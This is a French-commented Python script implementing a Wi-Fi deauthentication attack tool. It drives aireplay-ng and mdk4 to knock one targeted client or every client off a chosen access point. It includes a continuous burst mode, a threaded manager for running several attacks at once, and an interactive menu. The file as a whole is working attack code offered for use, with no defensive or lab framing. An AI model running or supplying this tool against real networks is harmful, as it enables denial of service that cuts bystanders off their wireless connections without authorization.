#!/usr/bin/env python3

import subprocess
import time
import os
import re
import sys
from colorama import init, Fore, Style
# Initialiser Colorama
init(autoreset=True)
class DeauthAttack:
    def __init__(self, interface_mon, bssid, channel=None, client_mac=None):
        """
        Initialise une attaque de déauthentification
       
        Args:
            interface_mon: Interface en mode monitor (ex: wlan0mon)
            bssid: Adresse MAC du point d'accès
            channel: Canal du réseau (optionnel mais recommandé)
            client_mac: Adresse MAC du client (optionnel, None pour broadcast)
        """
        self.interface_mon = interface_mon
        self.bssid = bssid
        self.channel = self._clean_channel(channel)
        self.client_mac = client_mac
        self.is_running = False
        self.packets_sent = 0
        self.attack_count = 0
       
    def _clean_channel(self, channel):
        """Nettoie et valide le numéro de canal"""
        if channel is None or channel == '':
            return None
       
        try:
            # Extraire les chiffres seulement
            if isinstance(channel, str):
                match = re.search(r'(\d+)', channel)
                if match:
                    channel_num = int(match.group(1))
                    # Valider le canal (1-14 pour 2.4GHz, 36-165 pour 5GHz)
                    if 1 <= channel_num <= 14 or 36 <= channel_num <= 165:
                        return str(channel_num)
                    else:
                        print(f"{Fore.YELLOW}[!] Canal invalide: {channel_num}")
                        return None
            elif isinstance(channel, int):
                if 1 <= channel <= 14 or 36 <= channel <= 165:
                    return str(channel)
        except Exception as e:
            print(f"{Fore.YELLOW}[!] Erreur nettoyage canal: {e}")
       
        return None
   
    def _check_interface(self):
        """Vérifie que l'interface est en mode monitor"""
        try:
            result = subprocess.run(['iwconfig', self.interface_mon],
                                  capture_output=True,
                                  text=True,
                                  timeout=5)
           
            if 'Mode:Monitor' in result.stdout:
                return True
            else:
                print(f"{Fore.RED}[✗] Interface {self.interface_mon} pas en mode monitor")
                print(f"{Fore.YELLOW}[!] Sortie iwconfig: {result.stdout[:100]}")
                return False
               
        except Exception as e:
            print(f"{Fore.RED}[✗] Erreur vérification interface: {e}")
            return False
   
    def _set_channel(self):
        """Configure l'interface sur le bon canal"""
        if not self.channel:
            return False
       
        try:
            print(f"{Fore.CYAN}[*] Configuration du canal {self.channel}...")
           
            # Méthode 1: iwconfig
            result = subprocess.run(['iwconfig', self.interface_mon, 'channel', self.channel],
                                  capture_output=True,
                                  text=True,
                                  timeout=5)
           
            if result.returncode == 0:
                print(f"{Fore.GREEN}[✓] Canal configuré avec iwconfig")
                return True
           
            # Méthode 2: iw
            result = subprocess.run(['iw', 'dev', self.interface_mon, 'set', 'channel', self.channel],
                                  capture_output=True,
                                  text=True,
                                  timeout=5)
           
            if result.returncode == 0:
                print(f"{Fore.GREEN}[✓] Canal configuré avec iw")
                return True
           
            print(f"{Fore.YELLOW}[!] Impossible de configurer le canal {self.channel}")
            return False
           
        except Exception as e:
            print(f"{Fore.YELLOW}[!] Erreur configuration canal: {e}")
            return False
   
    def send_deauth(self, count=10):
        """
        Envoie des paquets de déauthentification
       
        Args:
            count: Nombre de paquets à envoyer
           
        Returns:
            bool: True si succès, False sinon
        """
        self.attack_count += 1
       
        print(f"{Fore.CYAN}{'='*60}")
        print(f"{Fore.YELLOW} ATTAQUE #{self.attack_count} - DÉAUTHENTIFICATION")
        print(f"{Fore.CYAN}{'='*60}")
       
        # Afficher les informations
        print(f"\n{Fore.CYAN}📡 INFORMATIONS:")
        print(f" {Fore.WHITE}Interface: {Fore.YELLOW}{self.interface_mon}")
        print(f" {Fore.WHITE}BSSID: {Fore.YELLOW}{self.bssid}")
       
        if self.channel:
            print(f" {Fore.WHITE}Canal: {Fore.MAGENTA}{self.channel}")
       
        if self.client_mac:
            print(f" {Fore.WHITE}Client: {Fore.MAGENTA}{self.client_mac}")
            print(f" {Fore.WHITE}Mode: {Fore.YELLOW}Ciblé")
        else:
            print(f" {Fore.WHITE}Mode: {Fore.RED}Broadcast (tous les clients)")
       
        print(f" {Fore.WHITE}Paquets: {Fore.CYAN}{count}")
       
        # Vérifier l'interface
        if not self._check_interface():
            print(f"{Fore.RED}[✗] Impossible de continuer")
            return False
       
        # Configurer le canal si spécifié
        if self.channel:
            self._set_channel()
       
        # Essayer différentes méthodes dans l'ordre
        methods = [
            self._method_aireplay_basic, # Méthode de base
            self._method_aireplay_channel, # Avec canal
            self._method_aireplay_verbose, # Mode verbeux
            self._method_mdk4 # Alternative avec mdk4
        ]
       
        success = False
        for method_num, method in enumerate(methods, 1):
            print(f"\n{Fore.CYAN}{'─'*50}")
            print(f"{Fore.YELLOW} MÉTHODE {method_num}/{len(methods)}")
            print(f"{Fore.CYAN}{'─'*50}")
           
            success = method(count)
            if success:
                break
            elif method_num < len(methods):
                print(f"{Fore.YELLOW}[!] Échec, méthode suivante dans 2 secondes...")
                time.sleep(2)
       
        if success:
            print(f"\n{Fore.GREEN}{'═'*50}")
            print(f"{Fore.GREEN} ✓ DÉAUTHENTIFICATION RÉUSSIE!")
            print(f"{Fore.GREEN}{'═'*50}")
            return True
        else:
            print(f"\n{Fore.RED}{'═'*50}")
            print(f"{Fore.RED} ✗ TOUTES LES MÉTHODES ONT ÉCHOUÉ")
            print(f"{Fore.RED}{'═'*50}")
            return False
   
    def _method_aireplay_basic(self, count):
        """Méthode basique sans canal"""
        try:
            print(f"{Fore.CYAN}[*] Méthode basique...")
           
            # Construire la commande
            cmd = ['aireplay-ng', '--deauth', str(count), '-a', self.bssid]
           
            if self.client_mac:
                cmd.extend(['-c', self.client_mac])
           
            cmd.append(self.interface_mon)
           
            print(f"{Fore.CYAN}[*] Commande: {' '.join(cmd)}")
            print(f"{Fore.YELLOW}[!] Appuyez sur Ctrl+C pour arrêter")
           
            # Exécuter
            process = subprocess.Popen(cmd,
                                     stdout=subprocess.PIPE,
                                     stderr=subprocess.PIPE,
                                     text=True,
                                     bufsize=1,
                                     universal_newlines=True)
           
            # Lire la sortie en temps réel
            for line in process.stdout:
                line = line.strip()
                if line:
                    # Filtrer et afficher les lignes importantes
                    if 'Sent' in line or 'sent' in line.lower():
                        print(f"{Fore.GREEN}[✓] {line}")
                        # Extraire le nombre de paquets
                        if 'Sent' in line:
                            parts = line.split()
                            for part in parts:
                                if part.isdigit():
                                    self.packets_sent += int(part)
                    elif 'Waiting' in line:
                        print(f"{Fore.YELLOW}[*] {line}")
                    elif line.startswith('00:'): # Format heure
                        continue
                    else:
                        print(f" {line}")
           
            # Attendre la fin
            try:
                process.wait(timeout=30)
            except subprocess.TimeoutExpired:
                print(f"{Fore.YELLOW}[!] Timeout")
                process.terminate()
                return False
           
            # Vérifier le code de retour
            if process.returncode == 0:
                return True
            else:
                # Lire les erreurs
                stderr = process.stderr.read()
                if stderr:
                    print(f"{Fore.RED}[!] Erreur: {stderr[:200]}")
                return False
               
        except KeyboardInterrupt:
            print(f"\n{Fore.YELLOW}[!] Interrompu par l'utilisateur")
            if 'process' in locals():
                process.terminate()
            return False
        except Exception as e:
            print(f"{Fore.RED}[!] Exception: {e}")
            return False
   
    def _method_aireplay_channel(self, count):
        """Méthode avec canal spécifié"""
        if not self.channel:
            print(f"{Fore.YELLOW}[!] Pas de canal spécifié, saut de cette méthode")
            return False
       
        try:
            print(f"{Fore.CYAN}[*] Méthode avec canal {self.channel}...")
           
            cmd = ['aireplay-ng', '--deauth', str(count), '-a', self.bssid]
           
            if self.client_mac:
                cmd.extend(['-c', self.client_mac])
           
            # CORRECT: utiliser --channel pour le canal numérique
            cmd.extend(['--channel', self.channel])
           
            cmd.append(self.interface_mon)
           
            print(f"{Fore.CYAN}[*] Commande: {' '.join(cmd)}")
           
            # Exécuter
            result = subprocess.run(cmd,
                                  capture_output=True,
                                  text=True,
                                  timeout=30)
           
            # Afficher la sortie
            if result.stdout:
                lines = result.stdout.split('\n')
                for line in lines:
                    line = line.strip()
                    if line:
                        if 'Sent' in line or 'sent' in line.lower():
                            print(f"{Fore.GREEN}[✓] {line}")
                            # Extraire le nombre de paquets
                            if 'Sent' in line:
                                parts = line.split()
                                for part in parts:
                                    if part.isdigit():
                                        self.packets_sent += int(part)
                        elif 'Waiting' in line:
                            print(f"{Fore.YELLOW}[*] {line}")
                        elif not line.startswith('00:'):
                            print(f" {line}")
           
            if result.returncode == 0:
                return True
            else:
                if result.stderr:
                    print(f"{Fore.RED}[!] Erreur: {result.stderr[:200]}")
                return False
               
        except subprocess.TimeoutExpired:
            print(f"{Fore.YELLOW}[!] Timeout")
            return False
        except Exception as e:
            print(f"{Fore.RED}[!] Exception: {e}")
            return False
   
    def _method_aireplay_verbose(self, count):
        """Méthode avec plus de verbosité"""
        try:
            print(f"{Fore.CYAN}[*] Méthode verbeuse...")
           
            cmd = ['aireplay-ng', '--deauth', str(count), '-a', self.bssid, '-v']
           
            if self.client_mac:
                cmd.extend(['-c', self.client_mac])
           
            cmd.append(self.interface_mon)
           
            print(f"{Fore.CYAN}[*] Commande: {' '.join(cmd)}")
           
            process = subprocess.Popen(cmd,
                                     stdout=subprocess.PIPE,
                                     stderr=subprocess.PIPE,
                                     text=True,
                                     bufsize=1,
                                     universal_newlines=True)
           
            # Lire ligne par ligne
            output = []
            for line in process.stdout:
                line = line.strip()
                if line:
                    output.append(line)
                    if 'deauth' in line.lower() or 'sent' in line.lower():
                        print(f"{Fore.CYAN}[*] {line}")
           
            process.wait(timeout=30)
           
            # Analyser la sortie pour le succès
            success = False
            for line in output:
                if 'sent' in line.lower() and 'deauth' in line.lower():
                    success = True
                    break
           
            return success or process.returncode == 0
           
        except Exception as e:
            print(f"{Fore.RED}[!] Exception: {e}")
            return False
   
    def _method_mdk4(self, count):
        """Méthode alternative avec mdk4"""
        try:
            # Vérifier si mdk4 est installé
            check = subprocess.run(['which', 'mdk4'],
                                 capture_output=True,
                                 text=True)
           
            if check.returncode != 0:
                print(f"{Fore.YELLOW}[!] mdk4 n'est pas installé")
                print(f"{Fore.YELLOW}[!] Installez-le: sudo apt install mdk4")
                return False
           
            print(f"{Fore.CYAN}[*] Utilisation de mdk4...")
           
            # Créer fichier de cibles
            targets_file = '/tmp/mdk4_targets.txt'
            with open(targets_file, 'w') as f:
                f.write(f"{self.bssid}\n")
                if self.client_mac:
                    f.write(f"{self.client_mac}\n")
           
            # Construire la commande mdk4
            cmd = ['mdk4', self.interface_mon, 'd', '-b', targets_file]
           
            if self.channel:
                cmd.extend(['-c', self.channel])
           
            print(f"{Fore.CYAN}[*] Commande mdk4: {' '.join(cmd)}")
            print(f"{Fore.YELLOW}[!] mdk4 démarré, arrêt dans 10 secondes...")
           
            # Exécuter mdk4 avec timeout
            process = subprocess.Popen(cmd,
                                     stdout=subprocess.DEVNULL,
                                     stderr=subprocess.DEVNULL)
           
            # Laisser tourner un moment
            time.sleep(10)
           
            # Arrêter
            process.terminate()
            try:
                process.wait(timeout=5)
            except:
                process.kill()
           
            # Nettoyer
            if os.path.exists(targets_file):
                os.remove(targets_file)
           
            print(f"{Fore.GREEN}[✓] mdk4 terminé")
            return True
           
        except Exception as e:
            print(f"{Fore.RED}[!] Exception mdk4: {e}")
            # Nettoyer en cas d'erreur
            if os.path.exists('/tmp/mdk4_targets.txt'):
                os.remove('/tmp/mdk4_targets.txt')
            return False
   
    def continuous_deauth(self, interval=5, count_per_burst=5):
        """
        Déauthentification continue
       
        Args:
            interval: Secondes entre les rafales
            count_per_burst: Paquets par rafale
        """
        print(f"{Fore.CYAN}{'='*60}")
        print(f"{Fore.YELLOW} DÉAUTHENTIFICATION CONTINUE")
        print(f"{Fore.CYAN}{'='*60}")
       
        print(f"\n{Fore.CYAN}⚙️ PARAMÈTRES:")
        print(f" {Fore.WHITE}Intervalle: {Fore.CYAN}{interval} secondes")
        print(f" {Fore.WHITE}Paquets/rafale: {Fore.CYAN}{count_per_burst}")
        print(f" {Fore.WHITE}Mode: {'Broadcast' if not self.client_mac else 'Ciblé'}")
        print(f"\n{Fore.YELLOW}[!] Appuyez sur Ctrl+C pour arrêter")
       
        self.is_running = True
        cycle = 0
        total_success = 0
        total_failed = 0
       
        try:
            while self.is_running:
                cycle += 1
                print(f"\n{Fore.CYAN}{'─'*40}")
                print(f"{Fore.YELLOW} CYCLE #{cycle}")
                print(f"{Fore.CYAN}{'─'*40}")
               
                # Envoyer une rafale
                success = self.send_deauth(count=count_per_burst)
               
                if success:
                    total_success += 1
                else:
                    total_failed += 1
               
                if not self.is_running:
                    break
               
                # Statistiques
                print(f"\n{Fore.CYAN}📊 STATISTIQUES:")
                print(f" {Fore.WHITE}Cycles: {Fore.CYAN}{cycle}")
                print(f" {Fore.WHITE}Réussis: {Fore.GREEN}{total_success}")
                print(f" {Fore.WHITE}Échoués: {Fore.RED}{total_failed}")
                print(f" {Fore.WHITE}Paquets envoyés: {Fore.CYAN}{self.packets_sent}")
               
                # Attendre avant la prochaine rafale
                print(f"\n{Fore.CYAN}[*] Prochaine rafale dans {interval}s...")
                for i in range(interval, 0, -1):
                    if not self.is_running:
                        break
                    print(f"\r{Fore.CYAN} Début dans {i:2d}s...", end='', flush=True)
                    time.sleep(1)
                print()
               
        except KeyboardInterrupt:
            print(f"\n\n{Fore.YELLOW}[!] Déauthentification continue arrêtée")
            self.is_running = False
        except Exception as e:
            print(f"\n{Fore.RED}[✗] Erreur: {e}")
            self.is_running = False
       
        # Résumé final
        print(f"\n{Fore.CYAN}{'='*60}")
        print(f"{Fore.YELLOW} RÉSUMÉ FINAL")
        print(f"{Fore.CYAN}{'='*60}")
        print(f" {Fore.WHITE}Cycles totaux: {Fore.CYAN}{cycle}")
        print(f" {Fore.WHITE}Attaques réussies: {Fore.GREEN}{total_success}")
        print(f" {Fore.WHITE}Attaques échouées: {Fore.RED}{total_failed}")
        print(f" {Fore.WHITE}Paquets totaux: {Fore.CYAN}{self.packets_sent}")
        print(f"{Fore.GREEN}[✓] Mode continu terminé")
   
    def stop(self):
        """Arrête la déauthentification continue"""
        self.is_running = False
        print(f"{Fore.GREEN}[✓] Attaque arrêtée sur demande")
   
    def get_status(self):
        """Retourne le statut de l'attaque"""
        return {
            'is_running': self.is_running,
            'packets_sent': self.packets_sent,
            'attack_count': self.attack_count,
            'bssid': self.bssid,
            'channel': self.channel,
            'client': self.client_mac
        }
class DeauthManager:
    """Gestionnaire pour plusieurs attaques simultanées"""
   
    def __init__(self, interface_mon):
        self.interface_mon = interface_mon
        self.attacks = []
        self.is_running = False
   
    def add_attack(self, bssid, channel=None, client_mac=None):
        """Ajoute une attaque à la liste"""
        attack = DeauthAttack(self.interface_mon, bssid, channel, client_mac)
        self.attacks.append(attack)
        return attack
   
    def start_all(self, interval=10, count_per_burst=5):
        """Démarre toutes les attaques en continu"""
        if not self.attacks:
            print(f"{Fore.RED}[✗] Aucune attaque configurée")
            return
       
        print(f"{Fore.CYAN}[*] Démarrage de {len(self.attacks)} attaques...")
        self.is_running = True
       
        import threading
       
        threads = []
        for i, attack in enumerate(self.attacks, 1):
            print(f"{Fore.CYAN}[*] Lancement attaque #{i}: {attack.bssid}")
            thread = threading.Thread(target=attack.continuous_deauth,
                                     args=(interval, count_per_burst))
            thread.daemon = True
            thread.start()
            threads.append(thread)
            time.sleep(1)
       
        # Attendre l'interruption utilisateur
        try:
            input(f"\n{Fore.YELLOW}[!] Appuyez sur Entrée pour arrêter toutes les attaques...")
        except KeyboardInterrupt:
            print(f"\n{Fore.YELLOW}[!] Interruption détectée")
       
        self.stop_all()
   
    def stop_all(self):
        """Arrête toutes les attaques"""
        print(f"{Fore.CYAN}[*] Arrêt de toutes les attaques...")
        self.is_running = False
        for attack in self.attacks:
            attack.stop()
        print(f"{Fore.GREEN}[✓] Toutes les attaques sont arrêtées")
   
    def get_status_all(self):
        """Retourne le statut de toutes les attaques"""
        status = []
        for i, attack in enumerate(self.attacks, 1):
            attack_status = attack.get_status()
            attack_status['id'] = i
            status.append(attack_status)
        return status
   
    def display_status(self):
        """Affiche le statut de toutes les attaques"""
        if not self.attacks:
            print(f"{Fore.YELLOW}[!] Aucune attaque en cours")
            return
       
        print(f"\n{Fore.CYAN}{'='*60}")
        print(f"{Fore.YELLOW} STATUT DES ATTAQUES")
        print(f"{Fore.CYAN}{'='*60}")
       
        for i, attack in enumerate(self.attacks, 1):
            status = "EN COURS" if attack.is_running else "ARRÊTÉE"
            status_color = Fore.GREEN if attack.is_running else Fore.RED
           
            print(f"\n{Fore.CYAN}Attaque #{i}:")
            print(f" {Fore.WHITE}BSSID: {Fore.YELLOW}{attack.bssid}")
            if attack.channel:
                print(f" {Fore.WHITE}Canal: {Fore.MAGENTA}{attack.channel}")
            if attack.client_mac:
                print(f" {Fore.WHITE}Client: {Fore.MAGENTA}{attack.client_mac}")
            print(f" {Fore.WHITE}Statut: {status_color}{status}")
            print(f" {Fore.WHITE}Paquets: {Fore.CYAN}{attack.packets_sent}")
            print(f" {Fore.WHITE}Attaques: {Fore.CYAN}{attack.attack_count}")
# Test autonome
if __name__ == "__main__":
    print(f"{Fore.CYAN}{'='*70}")
    print(f"{Fore.YELLOW} TEST AUTONOME DU MODULE DEAUTH")
    print(f"{Fore.CYAN}{'='*70}")
   
    # Vérifier les arguments
    if len(sys.argv) < 3:
        print(f"{Fore.YELLOW}[!] Usage: sudo python3 deauth.py <interface> <bssid> [canal] [client_mac]")
        print(f"{Fore.YELLOW}[!] Exemple: sudo python3 deauth.py wlan0mon AA:BB:CC:DD:EE:FF 6")
        sys.exit(1)
   
    interface = sys.argv[1]
    bssid = sys.argv[2]
    channel = sys.argv[3] if len(sys.argv) > 3 else None
    client_mac = sys.argv[4] if len(sys.argv) > 4 else None
   
    print(f"\n{Fore.CYAN}[*] Configuration:")
    print(f" Interface: {interface}")
    print(f" BSSID: {bssid}")
    print(f" Canal: {channel}")
    print(f" Client: {client_mac}")
   
    # Créer l'attaque
    deauth = DeauthAttack(interface, bssid, channel, client_mac)
   
    # Menu
    print(f"\n{Fore.CYAN}[*] Options:")
    print(f" 1. Attaque simple (10 paquets)")
    print(f" 2. Attaque personnalisée")
    print(f" 3. Mode continu")
   
    try:
        choice = input(f"\n{Fore.YELLOW}[?] Votre choix (1-3): ").strip()
       
        if choice == '1':
            deauth.send_deauth(count=10)
        elif choice == '2':
            count = input(f"{Fore.YELLOW}[?] Nombre de paquets [10]: ").strip()
            count = int(count) if count else 10
            deauth.send_deauth(count=count)
        elif choice == '3':
            interval = input(f"{Fore.YELLOW}[?] Intervalle entre rafales [5]: ").strip()
            interval = int(interval) if interval else 5
            burst = input(f"{Fore.YELLOW}[?] Paquets par rafale [5]: ").strip()
            burst = int(burst) if burst else 5
            deauth.continuous_deauth(interval=interval, count_per_burst=burst)
        else:
            print(f"{Fore.RED}[✗] Choix invalide")
           
    except KeyboardInterrupt:
        print(f"\n{Fore.YELLOW}[!] Interrompu")
    except Exception as e:
        print(f"{Fore.RED}[✗] Erreur: {e}")
   
    print(f"\n{Fore.GREEN}[✓] Test terminé")
